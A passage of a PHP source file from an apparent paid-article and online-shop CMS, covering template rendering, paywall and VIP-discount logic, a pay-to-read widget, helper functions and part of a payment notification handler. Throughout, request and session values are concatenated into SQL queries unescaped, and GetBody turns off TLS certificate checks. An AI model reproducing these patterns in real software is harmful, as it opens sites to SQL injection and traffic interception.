	$sql="select * from sl_nsort where S_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_sub]",$row["S_sub"],$t);
		$t = str_Replace("[S_pic]",$row["S_pic"],$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_order]",$row["S_order"],$t);
		$t = str_Replace("[S_content]",$row["S_content"],$t);
	}else{
		if(intval($M_id)>0){
			$M_shop=getrs("select * from sl_member where M_id=$M_id","M_shop");
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]",$M_shop,$t);
			$t = str_Replace("[S_content]",$M_shop,$t);
			$t = str_Replace("[S_pic]","nopic.png",$t);
		}else{
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]","全部文章",$t);
			$t = str_Replace("[S_content]","All Articles",$t);
			$t = str_Replace("[S_pic]","nopic.png",$t);
		}
		
	}
	return $t;
}

function newsinfo($t){
	global $conn,$id;
	$genkey=t($_GET["genkey"]);
	$sql="select * from sl_news,sl_nsort where N_sort=S_id and N_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[N_id]",$row["N_id"],$t);
		$t = str_Replace("[N_title]",$row["N_title"],$t);
		$t = str_Replace("[N_pic]",$row["N_pic"],$t);
		$t = str_Replace("[N_sort]",$row["N_sort"],$t);
		$t = str_Replace("[N_view]",$row["N_view"],$t);
		$t = str_Replace("[N_author]",$row["N_author"],$t);
		$t = str_Replace("[N_date]",$row["N_date"],$t);
		$t = str_Replace("[N_price]",$row["N_price"],$t);
		$N_content=$row["N_content"];

		if($row["N_video"]!=""){
			if(strpos($row["N_video"],"<")!==false){
			    $N_video=$row["N_video"];
			}else{
			    if(substr($row["N_video"],0,7)=="http://" || substr($row["N_video"],0,8)=="https://"){
			        $N_video="<video width=\"100%\" controls><source src=\"".$row["N_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }else{
			        $N_video="<video width=\"100%\" controls><source src=\"media/".$row["N_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }
			}
		$N_content="<div style=\"margin-bottom:10px;\">".$N_video."</div>".$N_content;
		}

		$N_price=$row["N_price"];
		$N_date=$row["N_date"];
		$N_long=$row["N_long"];
		$N_tag=$row["N_tag"];
		$tag=explode(" ",$N_tag);
        for($i=0;$i<count($tag);$i++){
        	if($tag[$i]!=""){
        		$tags=$tags."<a style=\"border:solid 1px #AAAAAA;display:inline-block;padding:2px 5px;border-radius:5px;margin:5px;font-size:12px;\" href=\"?type=news&tag=".$tag[$i]."\">".$tag[$i]."</a>";
        	}
        	
    	}
    	if($N_tag!=""){
    		$t = str_Replace("[N_tag]","标签：".$tags,$t);
    	}else{
    		$t = str_Replace("[N_tag]","",$t);
    	}
		$length=mb_strlen(strip_tags($N_content),"utf-8");
		if(strpos($row["N_content"],"[fh_free]")!==false){
			$N_preview="<b>免费预览：</b>".splitx($row["N_content"],"[fh_free]",0)."<div style=\"border-bottom:1px solid #EEEEEE;padding-bottom:30px;margin-bottom:30px;\"></div>";
		}
	}

	$sql="select * from sl_news where N_del=0 order by N_order,N_id desc";
	$result = mysqli_query($conn,  $sql);
	if (mysqli_num_rows($result) > 0) {
	while($row = mysqli_fetch_assoc($result)) {
	    $Ne_list=$Ne_list.$row["N_id"].",";
	  }
	}
	$Ne_list=",0,".$Ne_list."0,";

	$N_Nid=splitx(splitx($Ne_list,",".$id.",",1),",",0);
	$N_Pid=splitx(splitx($Ne_list,",".$id.",",0),",",count(explode(",",splitx($Ne_list,",".$id.",",0)))-1);

	if($N_Nid=="0"){
	  $N_Ntitle="没有了";
	  $N_Nurl="javascript:;";
	}else{
	  $N_Ntitle=getrs("select * from sl_news where N_del=0 and N_id=".intval($N_Nid),"N_title");
	  $N_Nurl="?type=newsinfo&id=".$N_Nid;
	  
	}
	if($N_Pid=="0"){
	  $N_Ptitle="没有了";
	  $N_Purl="javascript:;";
	}else{
	  $N_Ptitle=getrs("select * from sl_news where N_del=0 and N_id=".intval($N_Pid),"N_title");
	  $N_Purl="?type=newsinfo&id=".$N_Pid;
	}
	$t = str_Replace("[N_Ntitle]",$N_Ntitle,$t);
	$t = str_Replace("[N_Nurl]",$N_Nurl,$t);
	$t = str_Replace("[N_Ptitle]",$N_Ptitle,$t);
	$t = str_Replace("[N_Purl]",$N_Purl,$t);

	if($N_price>0){//文章不免费
		if($N_long==0){//没开启了限时付费
			if(getrs("select * from sl_orders where O_content='".$genkey."' and O_nid=$id","O_id")!="" && $genkey!=""){//已免登录购买
				$t = str_Replace("[N_content]",str_replace("[fh_free]","",$N_content),$t);
			}else{
				if($_SESSION["M_id"]!=""){//登录了会员
					$sql = "Select * from sl_orders where O_del=0 and O_type=1 and O_nid=$id and O_mid=".intval($_SESSION["M_id"]);
					$result = mysqli_query($conn, $sql);
					$row = mysqli_fetch_assoc($result);
					if (mysqli_num_rows($result) > 0) {//已购买
						$t = str_Replace("[N_content]",str_replace("[fh_free]","",$N_content),$t);
					} else {//没购买
						$sql="select * from sl_member where M_id=".intval($_SESSION["M_id"]);
						$result = mysqli_query($conn, $sql);
						$row = mysqli_fetch_assoc($result);
						$M_viptime=$row["M_viptime"];
						$M_viplong=$row["M_viplong"];
						if($M_viplong-(time()-strtotime($M_viptime))/86400>0){
							if($M_viplong>30000){
								$N_discount=$C_n_discount2/10;
							}else{
								$N_discount=$C_n_discount/10;

							}
						}else{
							$N_discount=1;
						}
						if($N_discount==0){//VIP会员0折
							$t = str_Replace("[N_content]",str_replace("[fh_free]","",$N_content),$t);
						}else{
							$t = str_Replace("[N_content]",$N_preview.buynews("#f32196",$N_price,$id),$t);
						}
					}
				}else{//没登录会员
					$t = str_Replace("[N_content]",$N_preview.buynews("#f32196",$N_price,$id),$t);
				}
			}
		}else{//开启了限时付费
			if(time()>strtotime("+$N_long hour",strtotime($N_date))){//已过收费期
				$t = str_Replace("[N_content]",str_replace("[fh_free]","",$N_content),$t);
			}else{//未过收费期
				$t = str_Replace("[N_content]",$N_preview.buynews("#f32196",$N_price,$id),$t);
			}
		}
	}else{//免费
		$t = str_Replace("[N_content]",str_replace("[fh_free]","",$N_content),$t);
	}

	return $t;
}

function product($t){
	global $conn,$id;
	$M_id=intval($_GET["M_id"]);
	$sql="select * from sl_psort where S_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[S_sub]",$row["S_sub"],$t);
		$t = str_Replace("[S_pic]",$row["S_pic"],$t);
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_order]",$row["S_order"],$t);
		$t = str_Replace("[S_content]",$row["S_content"],$t);
	}else{
		if(intval($M_id)>0){
			$M_shop=getrs("select * from sl_member where M_id=$M_id","M_shop");
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]",$M_shop,$t);
			$t = str_Replace("[S_content]",$M_shop,$t);
			$t = str_Replace("[S_pic]","nopic.png",$t);
		}else{
			$t = str_Replace("[S_id]","0",$t);
			$t = str_Replace("[S_title]","全部商品",$t);
			$t = str_Replace("[S_content]","All Product",$t);
			$t = str_Replace("[S_pic]","nopic.png",$t);
		}
	}
	return $t;
}

function productinfo($t){
	global $conn,$id;
	$B_count=getrs("select count(*) as B_count from sl_orders where not O_state=2 and O_pid=".$id,"B_count");
	$E_count=getrs("select count(*) as E_count from sl_evaluate,sl_orders where E_oid=O_id and O_pid=$id","E_count");

	$sql="select * from sl_product,sl_psort where P_sort=S_id and P_id=".$id;
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_assoc($result);
	if (mysqli_num_rows($result) > 0) {
		$t = str_Replace("[S_title]",$row["S_title"],$t);
		$t = str_Replace("[S_id]",$row["S_id"],$t);
		$t = str_Replace("[P_id]",$row["P_id"],$t);
		$t = str_Replace("[P_title]",$row["P_title"],$t);
		$t = str_Replace("[P_view]",$row["P_view"],$t);
		$t = str_Replace("[P_time]",$row["P_time"],$t);
		$t = str_Replace("[P_sold]",$row["P_sold"],$t);
		$t = str_Replace("[P_pic]",splitx($row["P_pic"],"|",0),$t);

		if($row["P_mid"]==0){
			$zy="<span style=\"font-size:12px;background:#c81623;border-radius:5px;padding:2px 3px;color:#ffffff;margin-right:5px;display:inline;\">自营</span>";
			$shop="<span style=\"font-size:12px;background:#c81623;border-radius:5px;padding:2px 3px;color:#ffffff;display:inline;margin:0 2px;\">官方自营店</span>";
		}else{
			$zy="";
			$shop="<a href=\"./?type=product&M_id=".intval($row["P_mid"])."\" style=\"font-size:12px;background:#0099ff;border-radius:5px;padding:2px 3px;color:#ffffff;display:inline;margin:0 2px;\">".getrs("select * from sl_member where M_id=".intval($row["P_mid"]),"M_shop")."</a>";
		}
		$t = str_Replace("[P_zy]",$zy,$t);
		$t = str_Replace("[P_shop]",$shop,$t);

		$P_content=$row["P_content"];

		if($row["P_shuxing"]!=""){
			$s=explode("\r",$row["P_shuxing"]);
			for($i=0;$i<count($s);$i++){
				$shuxing=$shuxing."<div style=\"width:33%;display:inline-block\">".$s[$i]."</div>";
			}
			$shuxing="<div style=\"background:#f7f7f7;border:solid 1px #DDDDDD;padding:20px;margin-bottom:10px;\"><p><b>商品参数：</b></p>".$shuxing."</div>";
		}
		if($row["P_video"]!=""){
			if(strpos($row["P_video"],"<")!==false){
			    $P_video=$row["P_video"];
			}else{
			    if(substr($row["P_video"],0,7)=="http://" || substr($row["P_video"],0,8)=="https://"){
			        $P_video="<video width=\"100%\" controls><source src=\"".$row["P_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }else{
			        $P_video="<video width=\"100%\" controls><source src=\"media/".$row["P_video"]."\" type=\"video/mp4\">您的浏览器不支持 video 标签。</video>";
			    }
			}
		$P_content="<div style=\"margin-bottom:10px;\">".$P_video."</div>".$P_content;
		}
		$t = str_Replace("[P_shuxing]",$shuxing,$t);
		$t = str_Replace("[P_content]",$P_content,$t);
		$t = str_Replace("[P_sort]",$row["P_sort"],$t);
		$t = str_Replace("[P_price]",$row["P_price"],$t);
		$t = str_Replace("[P_sell]",$row["P_sell"],$t);
		$t = str_Replace("[P_selltype]",$row["P_selltype"],$t);
		$t = str_Replace("[B_count]",$B_count,$t);
		$t = str_Replace("[E_count]",$E_count,$t);
		$P_selltype=$row["P_selltype"];
		$P_sell=$row["P_sell"];
		$P_restx=$row["P_rest"];
		$P_tag=$row["P_tag"];
		$tag=explode(" ",$P_tag);
        for($i=0;$i<count($tag);$i++){
        	$tags=$tags."<a style=\"border:solid 1px #AAAAAA;display:inline-block;padding:2px 5px;border-radius:5px;margin:5px;font-size:12px;\" href=\"?type=product&tag=".$tag[$i]."\">".$tag[$i]."</a>";
    	}
    	if($P_tag!=""){
    		$t = str_Replace("[P_tag]","标签：".$tags,$t);
    	}else{
    		$t = str_Replace("[P_tag]","",$t);
    	}
	}

	switch ($P_selltype) {
		case 0:
			$P_resttitle="充足";
			$P_rest=1;
			break;

			case 1:
			$P_resttitle=getrs("select count(C_id) as C_count from sl_card where C_sort=".intval($P_sell)." and C_use=0 and C_del=0","C_count")."件";
			$P_rest=getrs("select count(C_id) as C_count from sl_card where C_sort=".intval($P_sell)." and C_use=0 and C_del=0","C_count");
			break;

			case 2:
			$P_resttitle=$P_restx."件";
			$P_rest=$P_restx;
			break;
	}

	$sql="select * from sl_product where P_del=0 order by P_order,P_id desc";
	$result = mysqli_query($conn,  $sql);
	if (mysqli_num_rows($result) > 0) {
	while($row = mysqli_fetch_assoc($result)) {
	    $Pe_list=$Pe_list.$row["P_id"].",";
	  }
	}
	$Pe_list=",0,".$Pe_list."0,";

	$P_Nid=splitx(splitx($Pe_list,",".$id.",",1),",",0);
	$P_Pid=splitx(splitx($Pe_list,",".$id.",",0),",",count(explode(",",splitx($Pe_list,",".$id.",",0)))-1);

	if($P_Nid=="0"){
	  $P_Ntitle="没有了";
	  $P_Nurl="javascript:;";
	}else{
	  $P_Ntitle=getrs("select * from sl_product where P_del=0 and P_id=".intval($P_Nid),"P_title");
	  $P_Nurl="?type=productinfo&id=".$P_Nid;
	}
	if($P_Pid=="0"){
	  $P_Ptitle="没有了";
	  $P_Purl="javascript:;";
	}else{
	  $P_Ptitle=getrs("select * from sl_product where P_del=0 and P_id=".intval($P_Pid),"P_title");
	  $P_Purl="?type=productinfo&id=".$P_Pid;
	}

	$t = str_Replace("[P_resttitle]",$P_resttitle,$t);
	$t = str_Replace("[P_rest]",$P_rest,$t);
	$t = str_Replace("[P_Ntitle]",$P_Ntitle,$t);
	$t = str_Replace("[P_Nurl]",$P_Nurl,$t);
	$t = str_Replace("[P_Ptitle]",$P_Ptitle,$t);
	$t = str_Replace("[P_Purl]",$P_Purl,$t);

	if($_SESSION["M_id"]==""){
		$fh_info="";
	}else{
		if($P_selltype==0 || $P_selltype==1){
			$fh_info="<div class=\"P_address\">[自动发货] 收件邮箱：".getrs("select * from sl_member where M_id=".$_SESSION["M_id"],"M_email")." <a href=\"member/edit.php\" target=\"_balnk\">[编辑]</a></div>";
		}else{

			$sql="select * from sl_address where A_del=0 and A_mid=".$_SESSION["M_id"];
			$result = mysqli_query($conn, $sql);
			
			if (mysqli_num_rows($result) > 0) {
				while($row = mysqli_fetch_assoc($result)) {
					if($row["A_default"]==1){
						$d="checked=\"checked\"";
					}else{
						$d="";
					}
					$fh=$fh."<p><label><input type=\"radio\" name=\"A_address\" value=\"".$row["A_id"]."\" ".$d."> ".$row["A_address"]." ".$row["A_name"]." ".$row["A_phone"]."</label></p>";
				}
				$fh_info="<div class=\"P_address\">选择收货地址 <a href=\"member/address.php\" target=\"_balnk\">[编辑]</a>：".$fh."  </div>";
			}else{
				$fh_info="<div class=\"P_address\">选择收货地址 <a href=\"member/address.php\" target=\"_balnk\">[新增]</a>：<p><label><input value=\"0\" type=\"radio\" name=\"A_address\" checked=\"checked\">暂无，请点击新增</label></p> </div>";
			}
		}
	}
	$t = str_Replace("[fh_address]","<style>.P_address{padding:10px;margin:10px 0;border:dashed 1px #DDDDDD;width:100%;border-radius:10px;box-shadow:0px 2px 10px #CCCCCC}</style>".$fh_info,$t);
	return $t;
}

function buynews($color,$N_price,$id){
  global $conn,$C_n_discount,$C_n_discount2;
  $genkey=gen_key(20);
  $sql="select * from sl_member where M_id=".intval($_SESSION["M_id"]);
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {

      $M_viptime=$row["M_viptime"];
      $M_viplong=$row["M_viplong"];

      if($M_viplong-(time()-strtotime($M_viptime))/86400>0){
      	if($M_viplong>30000){
      		$discount=$C_n_discount2/10;
      	}else{
      		$discount=$C_n_discount/10;
      	}
        
        $fee="<b style=\"color:".$color."\">".round($N_price*$discount,2)."元</b>[<del>原价：".$N_price."元</del>]";
      }else{
        $discount=1;
        $fee="<b style=\"color:".$color."\">".$N_price."元</b>";
      }
    }else{
      $discount=1;
      $fee="<b style=\"color:".$color."\">".$N_price."元</b>";
    }

  $N_long=getrs("select * from sl_news where N_id=".$id,"N_long");
  $N_date=getrs("select * from sl_news where N_id=".$id,"N_date");
  $N_fx=getrs("select * from sl_news where N_id=".$id,"N_fx");
	if($N_long>0){
		$N_longinfo="<br>[限时收费]本文章将在<span style=\"color:$color\">".date("Y-m-d H:i:s",strtotime("+$N_long hour",strtotime($N_date)))."</span>后免费开放阅读";
	}else{
		$N_longinfo="";
	}
  $api=$api."
  <style>
  .fh100_news_box{text-align:center;width:clac(100% - 40px);max-width:600px;margin:0 auto;border-radius:10px;border:dashed 1px ".$color.";padding:20px;box-shadow:0px 2px 10px #CCCCCC;font-size:15px}
  .fh100_news_btn{color:#ffffff !important;background:".$color.";display:inline-block;margin-top:10px;border-radius:10px;border:solid 1px ".$color.";padding:0 10px;font-size:15px}
  .fh100_news_btn:hover{color:".$color." !important;background:#ffffff;border:solid 1px ".$color.";}
  .fh100_qr_buy{display:inline-block;vertical-align:top;width:100px;margin-right:15px;}
  .fh100_qr_buy div{font-size:12px;}
  .fh100_news_buy{display:inline-block}
  .fh100_news_buy a{text-align:center}
  </style>";
  $api=$api."<form action=\"buy.php?type=newsinfo&id=$id\" method=\"post\">
        <div class=\"fh100_news_box\">";
		if(!isMobile()){
			$api=$api."<div class=\"fh100_qr_buy\">
		        	<div id=\"billImage\"></div>
		        	<div>扫码免登录支付</div>
		        </div>";
		}
        $api=$api."<div class=\"fh100_news_buy\">
        <div>本文章为付费文章，是否支付".$fee."后完整阅读？</div>
        <p style=\"font-size:12px;color:#AAAAAA\">如果您已购买过该文章，<a href=\"member/login.php?from=".urlencode("../?type=newsinfo&id=$id")."\">[登录帐号]</a>后即可查看".$N_longinfo."</p>
        <input type=\"hidden\" name=\"genkey\" value=\"$genkey\">
        <button class=\"fh100_news_btn\">支付".round($N_price*$discount,2)."元</button>";
        if(intval($_SESSION["M_id"])==0){
        	$api=$api." <a href=\"conn/unlogin.php?type=news&id=$id&genkey=$genkey\" class=\"fh100_news_btn\" target=\"_blank\" type=\"button\">免登录支付</a>";
        }

		if($N_fx==1){
			 $api=$api." <a href=\"conn/poster.php?type=news&id=$id&from=".intval($_SESSION["M_id"])."\" class=\"fh100_news_btn\" target=\"_blank\" type=\"button\">赚佣金</a>";
		}

        $api=$api."</div>
        </div>
        </form>";
	if(!isMobile()){
		$api=$api."<script src=\"js/qrcode.min.js\"></script>
		<script>
		var qrcode = new QRCode('billImage', {width: 100,height: 100,colorDark: '#000000',colorLight: '#ffffff',correctLevel: QRCode.CorrectLevel.H});
		qrcode.makeCode(\"".gethttp().splitx($_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'],"index.php",0)."conn/unlogin.php?type=news&id=$id&genkey=$genkey\");
		</script>";
	}
$api=$api."<script>
function news_post(){
	$.post(\"conn/unlogin.php?type=checkbuy&id=$id\",
    {
      genkey:\"$genkey\",
    },
  function(data){
  if(data==1){
  	window.location.href=window.location.href+\"&genkey=$genkey\";
  }
    });
}
setInterval(\"news_post()\",3000);
</script>";
  return $api;
}

function unlogin_product($class,$id,$genkey='a'){
	if($genkey=="a"){
		$genkey=gen_key(20);
	}
	$P_price=getrs("select P_price from sl_product where P_id=".intval($id),"P_price");
	$P_unlogin=getrs("select P_unlogin from sl_product where P_id=".intval($id),"P_unlogin");
	$P_fx=getrs("select P_fx from sl_product where P_id=".intval($id),"P_fx");

	if($P_unlogin==1 && $_SESSION["M_id"]==""){
		$unlogin="<button type=\"button\" onclick=\"window.location.href='conn/unlogin.php?type=product&id=$id&genkey=$genkey'\" class=\"$class\" target=\"_blank\">免登录购买</button>";
	}else{
		$unlogin="";
	}

	//if($P_price==0){
	//	$info=$unlogin;
	//}else{
	//	$info=$unlogin." <button class=\"$class\" onclick=\"addcart()\" type=\"button\" style=\"opacity:0.8;\">加入购物车</button>";
	//}

	if($P_fx==1){
		$unlogin=$unlogin." <button type=\"button\" onclick=\"javascript:window.location.href='conn/poster.php?type=product&id=$id&from=".intval($_SESSION["M_id"])."'\" class=\"$class\" target=\"_blank\">赚佣金</button>";
	}
	
	$info=$unlogin."<input type=\"hidden\" name=\"genkey\" value=\"$genkey\">";

	return $info;
}

function unlogin_product_qr($id,$genkey='a'){
	if($genkey=="a"){
		$genkey=gen_key(20);
	}
	$info="https://static.websiteonline.cn/website/qr/index.php?url=".urlencode(gethttp().splitx($_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'],"index.php",0)."conn/unlogin.php?type=product&id=".$id."&genkey=".$genkey);
	return $info;
}

function getrs($sqlx,$valuex){
	global $conn;
	$resultx = mysqli_query($conn, $sqlx);
	$rowx = mysqli_fetch_assoc($resultx);
	if (mysqli_num_rows($resultx) > 0) {
		return $rowx[$valuex];
	}else{
		return "";
	}
}

function gen_key($length,$type=1) { 
	switch ($type){
		case 1:
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
		break;
		case 2:
		$chars = '0123456789'; 
		break;
		case 3:
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
		break;
		default:
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
	}

	$password = ''; 
	for ( $i = 0; $i < $length; $i++ ) { 
	$password .= $chars[ mt_rand(0, strlen($chars) - 1) ]; 
	} 
	return $password; 
} 

function diffBetweenTwoDays ($day1, $day2)
{
  $second1 = strtotime($day1);
  $second2 = strtotime($day2);

  return round(($second2 - $second1) / 86400,0);
}

function splitx($a,$b,$c){
	$d=explode($b,$a);
	return $d[$c];
}

function GetBody($url, $xml,$method='POST'){    
    $second = 30;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_TIMEOUT, $second);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    $data = curl_exec($ch);
    if($data){
      curl_close($ch);
      return $data;
    } else { 
      $error = curl_errno($ch);
      curl_close($ch);
      return false;
    }
}

function isMobile() {
  // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
  if (isset($_SERVER['HTTP_X_WAP_PROFILE'])) {
    return true;
  }
  // 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
  if (isset($_SERVER['HTTP_VIA'])) {
    // 找不到为flase,否则为true
    return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
  }
  // 脑残法，判断手机发送的客户端标志,兼容性有待提高。其中'MicroMessenger'是电脑微信
  if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $clientkeywords = array('nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips','panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian','ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile','MicroMessenger');
    // 从HTTP_USER_AGENT中查找手机浏览器的关键字
    if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
      return true;
    }
  }
  // 协议法，因为有可能不准确，放到最后判断
  if (isset ($_SERVER['HTTP_ACCEPT'])) {
    // 如果只支持wml并且不支持html那一定是移动设备
    // 如果支持wml和html但是wml在html之前则是移动设备
    if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) {
      return true;
    }
  }
  return false;
}

function isWeixin() {
  if (strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false) {
    return true;
  } else {
    return false;
  }
}

function getip(){
	return $_SERVER['REMOTE_ADDR'];
}

Function DateAdd($part, $n, $date,$type="Y-m-d"){
switch($part){
case "y": $val = date($type, strtotime($date ." +$n year")); break;
case "m": $val = date($type, strtotime($date ." +$n month")); break;
case "w": $val = date($type, strtotime($date ." +$n week")); break;
case "d": $val = date($type, strtotime($date ." +$n day")); break;
case "h": $val = date($type, strtotime($date ." +$n hour")); break;
case "n": $val = date($type, strtotime($date ." +$n minute")); break;
case "s": $val = date($type, strtotime($date ." +$n second")); break;
}
return $val;
}

function box($B_text,$B_url,$B_type){
if ($B_url=="back"){
	echo "<script>alert('".$B_text."');history.back();</script>";
}else{
	echo "<script>alert('".$B_text."');window.location.href='".$B_url."';</script>";
}
die();
}

function GetUrl(){
if ($_SERVER["SERVER_PORT"]=="443"){
  $http="https://";
}else{
  $http="http://";
}
	return $http.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
}

function CopyMyFolder($source, $dest){
    if (!file_exists($dest)) mkdir($dest);
    $handle = opendir($source);
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $_source = $source . '/' . $item;
        $_dest = $dest . '/' . $item;
        if (is_file($_source)) copy($_source, $_dest);
        if (is_dir($_source)) CopyMyFolder($_source, $_dest);
    }
    closedir($handle);
}


function DeleteFolder($path){
    $handle = opendir($path);
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $_path = $path . '/' . $item;
        if (is_file($_path)) unlink($_path);
        if (is_dir($_path)) DeleteFolder($_path);
    }
    closedir($handle);
    return rmdir($path);
}

function t($str){
    $str=str_replace("\t","_",$str);
    $str=str_replace(" ","_",$str);
    $str=str_replace("(","_",$str);
    $str=str_replace(")","_",$str);
    $str=str_replace("<","_",$str);
    $str=str_replace(">","_",$str);
    $str=str_replace("/*","",$str);
    $str=str_replace("*/","",$str);
    $str=str_replace("#","",$str);
    $str=str_replace("-- ","",$str);
    $str=str_replace("'","‘",$str);
    $str=str_replace("\"","“",$str);
    return $str;
}


function CheckFields($myTable,$myFields){
	global $conn;
	$field = mysqli_query($conn,"Describe ".$myTable." ".$myFields);  
	$field = mysqli_fetch_array($field);  
	if($field[0]){  
		return 1;
	}else{
		return 0;
	}
}

function CheckTables($myTable){
	global $conn;
	$field = mysqli_query($conn,"SHOW TABLES LIKE '". $myTable."'");  
	$field = mysqli_fetch_array($field);  
	if($field[0]){  
		return 1;
	}else{
		return 0;
	}
}

function enname($name){
	if($name=="未登录帐号"){
		return "免登录购买";
	}else{
		return mb_substr($name,0,1,"utf-8")."***";
	}
	
}

function xcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length = 4;   
    $key = md5($key ? $key : $GLOBALS['discuz_auth_key']);   
    $keya = md5(substr($key, 0, 16));   
    $keyb = md5(substr($key, 16, 16));   
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length):substr(md5(microtime()), -$ckey_length)) : '';    
    $cryptkey = $keya.md5($keya.$keyc);   
    $key_length = strlen($cryptkey);   
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;   
    $string_length = strlen($string);   
    $result = '';   
    $box = range(0, 255);   
    $rndkey = array();     
    for($i = 0; $i <= 255; $i++) {   
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);   
    }    
    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }   
    for($a = $j = $i = 0; $i < $string_length; $i++) {   
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;   
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
    if($operation == 'DECODE') {   
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {   
            return substr($result, 26);   
        } else {   
            return '';   
        }   
    } else { 
        return $keyc.str_replace('=', '', base64_encode($result));   
    }   
}

function removeDir($dirName) 
{ 
    if(! is_dir($dirName)) 
    { 
        return false; 
    } 
    $handle = @opendir($dirName); 
    while(($file = @readdir($handle)) !== false) 
    { 
        if($file != '.' && $file != '..') 
        { 
            $dir = $dirName . '/' . $file; 
            is_dir($dir) ? removeDir($dir) : @unlink($dir); 
        } 
    } 
    closedir($handle); 
      
    return rmdir($dirName) ; 
} 

function notify($no,$type,$id,$genkey,$email,$num,$M_id,$money,$D_domain,$paytype){
	global $conn,$C_n_discount,$C_p_discount,$C_n_discount2,$C_p_discount2,$C_email,$C_fx1,$C_fx2,$C_fx3;
	$sql="select * from sl_member where M_id=".intval($M_id);
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    $M_id=$row["M_id"];
    $M_email=$row["M_email"];
    $M_money=$row["M_money"];
    $M_viptime=$row["M_viptime"];
    $M_viplong=$row["M_viplong"];

    if($M_viplong-(time()-strtotime($M_viptime))/86400>0){
        $M_vip=1;
        if($M_viplong>30000){
        	$N_discount=$C_n_discount2/10;
        	$P_discount=$C_p_discount2/10;
        }else{
        	$N_discount=$C_n_discount/10;
        	$P_discount=$C_p_discount/10;
        }
    }else{
        $M_vip=0;
        $N_discount=1;
        $P_discount=1;
    }

	$sql = "select * from sl_list where L_no='" . $no . "'";//用户充值
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) <= 0) {
        
        if($type=="news"){
			$sql2="select * from sl_news where N_del=0 and N_id=".$id;
			$result2 = mysqli_query($conn, $sql2);
			$row2 = mysqli_fetch_assoc($result2);
			if (mysqli_num_rows($result2) > 0) {
				$N_title=$row2["N_title"];
				$N_pic=$row2["N_pic"];
				$N_price=$row2["N_price"]*$N_discount;
				$N_mid=$row2["N_mid"];
				$N_fx=$row2["N_fx"];
			}
